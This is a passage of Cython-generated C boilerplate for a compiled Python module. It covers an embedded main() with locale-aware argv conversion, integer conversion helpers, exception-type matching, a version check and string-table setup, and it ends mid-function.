#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
